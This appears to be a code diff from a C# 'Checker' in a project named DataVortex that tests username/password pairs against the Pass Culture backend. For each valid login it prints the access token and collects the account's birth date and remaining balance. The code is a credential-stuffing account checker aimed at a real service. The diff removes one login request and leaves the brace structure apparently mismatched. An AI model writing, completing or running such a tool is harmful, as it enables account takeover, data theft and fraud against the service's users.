@@ -7,7 +7,6 @@ namespace DataVortex
     internal class Checker
     {
         public static double Remaining1 { get; private set; }
-        public static string Activity { get; private set; }
         public static string BirthDate { get; private set; }
 
         private static HashSet<string> foundAccounts = new HashSet<string>();
@@ -120,35 +119,7 @@ namespace DataVortex
                         Console.WriteLine($"accessToken: {accessToken}");
                         Console.ResetColor();
 
-                        var url2 = "https://backend.passculture.pro/users/signin";
-                        var httpRequest2 = (HttpWebRequest)WebRequest.Create(url2);
-                        httpRequest2.Method = "POST";
-
-                        httpRequest2.Headers["Authorization"] = "Bearer " + accessToken;
-                        httpRequest2.ContentType = "application/json";
-
-                        var data2 = "{\"identifier\":\"" + username + "\",\"password\":\"" + password + "\"}";
-
-                        using (var streamWriter2 = new StreamWriter(httpRequest2.GetRequestStream()))
-                        {
-                            streamWriter2.Write(data2);
-                        }
-
-                        var httpResponse2 = (HttpWebResponse)httpRequest2.GetResponse();
-                        using (var streamReader2 = new StreamReader(httpResponse2.GetResponseStream()))
-                        {
-                            var result2 = streamReader2.ReadToEnd();
-                            var jsonResponse2 = JObject.Parse(result2);
-
-                            if (jsonResponse2["activity"] != null)
-                            {
-                                Activity = jsonResponse2["activity"].ToString();
-                                Console.ForegroundColor = ConsoleColor.Yellow;
-                                Console.WriteLine($"activity: {Activity}");
-                                Console.ResetColor();
-                            }
-
-                            var url3 = "https://backend.passculture.app/native/v1/me";
+                        var url3 = "https://backend.passculture.app/native/v1/me";
                             var httpRequest3 = (HttpWebRequest)WebRequest.Create(url3);
                             httpRequest3.Headers["Authorization"] = "Bearer " + accessToken;
 
@@ -189,7 +160,6 @@ namespace DataVortex
                                 {
                                     Username = username,
                                     Password = password,
-                                    Activity = Activity,
                                     BirthDate = BirthDate,
                                     Remaining1 = Remaining1
                                 };
@@ -205,7 +175,7 @@ namespace DataVortex
                             }
                         }
                     }
-                }
+
                 // Marquer le compte comme vérifié une fois la vérification réussie
                 MarkAccountAsVerified(username, password);
             }
